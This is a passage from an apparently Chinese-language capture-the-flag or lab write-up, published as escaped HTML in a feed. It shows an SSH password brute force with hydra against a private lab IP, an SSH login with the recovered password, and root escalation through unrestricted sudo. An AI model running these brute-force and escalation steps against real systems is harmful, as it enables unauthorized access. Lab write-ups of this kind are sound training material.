&lt;h6 id="2入侵思路二ssh-密码爆破">2）入侵思路二：ssh 密码爆破&lt;/h6>
&lt;p>在&lt;code>dirb&lt;/code>扫描中，发现网站页面中包含用户名&lt;/p>
&lt;p>&lt;img src="img/20231209153557.png" alt="image.png">&lt;/p>
&lt;p>尝试使用 hydra 对 ssh 爆破&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hydra -l togie -P top1000.txt ssh://10.9.75.90 -V
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到密码：12345&lt;/p>
&lt;p>进行 ssh 连接&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh togie@10.9.75.90
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>连接成功！&lt;/strong>&lt;/p>
&lt;p>先查看用户权限&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现是&lt;code>(ALL : ALL) ALL&lt;/code>，直接&lt;code>sudo passwd root&lt;/code>或者&lt;code>sudo -i&lt;/code>提权&lt;/p></description></item></channel></rss>